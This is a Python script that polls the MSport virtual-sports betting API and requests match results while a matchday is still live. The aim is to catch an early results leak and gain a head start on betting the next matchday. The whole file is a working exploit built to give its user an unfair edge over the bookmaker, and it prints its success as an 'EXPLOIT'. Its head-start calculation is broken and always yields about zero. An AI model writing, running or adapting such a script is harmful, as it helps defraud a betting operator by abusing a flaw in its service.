#!/usr/bin/env python3
import time
import sys
from datetime import datetime
from pathlib import Path

# Add services dir to path so we can import msport_client
EMPIRE_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(EMPIRE_ROOT / "services"))

from common.msport_client import get_match_day_info, get_results

print("=== MSport 3-Minute Live Extraction Exploit Test ===")
print("Waiting for an active matchday to begin polling...")

current_md = None
season_id = None
md_start_time = None
results_extracted = False

while True:
    info = get_match_day_info()
    if not info:
        time.sleep(2)
        continue
        
    md = info.get("matchDay")
    sid = info.get("seasonId")
    status = info.get("status")  # UPCOMING, ONGOING/ACTIVE, FINISHED
    
    if current_md != md:
        # New Matchday detected
        current_md = md
        season_id = sid
        results_extracted = False
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] Detected Matchday {md} (Season {sid}) - Status: {status}")
        
    if status in ["ONGOING", "ACTIVE", 2, "2"]: # Status might be a string or int depending on API mapping
        if md_start_time is None:
            md_start_time = time.time()
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Matchday {md} is now LIVE. Virtual clock has started.")
            
        if not results_extracted:
            # Attempt the 3-minute exploit by forcefully requesting results BEFORE the match finishes
            results = get_results(season_id, md)
            if results and len(results) > 0:
                elapsed = time.time() - md_start_time
                print(f"\n[!!! EXPLOIT SUCCESSFUL !!!]")
                print(f"[{datetime.now().strftime('%H:%M:%S')}] Extracted full match results for MD {md} at exactly {elapsed:.1f} seconds into the virtual match!")
                print("Extracted Results Sample:")
                for r in results[:3]:
                    print(f"  {r.get('homeTeam')} {r.get('homeScore')} - {r.get('awayScore')} {r.get('awayTeam')}")
                
                print("\nWaiting to see when MSport actually officially finishes the match...")
                results_extracted = True
                
    elif status in ["FINISHED", 3, "3"]:
        if md_start_time and results_extracted:
            elapsed = time.time() - md_start_time
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Matchday {md} is finally officially FINISHED at {elapsed:.1f} seconds.")
            print(f"-> We gained a {elapsed - (time.time() - md_start_time)} second head-start to calculate bets for MD {md+1}!")
            break # Test complete
        elif md_start_time:
            elapsed = time.time() - md_start_time
            print(f"[{datetime.now().strftime('%H:%M:%S')}] Matchday officially FINISHED at {elapsed:.1f} seconds. Trying to pull results...")
            break
            
    time.sleep(1) # Poll rapidly to catch the exact second the results leak
